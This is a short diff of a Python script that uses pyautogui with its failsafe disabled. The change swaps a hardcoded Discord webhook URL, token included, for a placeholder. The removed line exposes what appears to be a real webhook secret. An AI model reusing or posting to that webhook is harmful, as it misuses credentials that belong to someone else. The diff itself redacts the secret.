@@ -25,7 +25,7 @@ except ImportError:
 pyautogui.FAILSAFE = False
 pyautogui.PAUSE = 0
 
-HOOK = "https://discord.com/api/webhooks/1566586654095843378/5cqaYBXxl9p4VDEGlsEAWP3TkQ-rakHUBpSVlqmgqFgKgDOXZsHgFWw1rxXSF61njsZG"
+HOOK = "your-webhook"
 
 ASCII_HEAD = r"""
   __  __           _        ____           _____ _               _                _____  _               ___  _____            ___    _____        __     __         _         _          
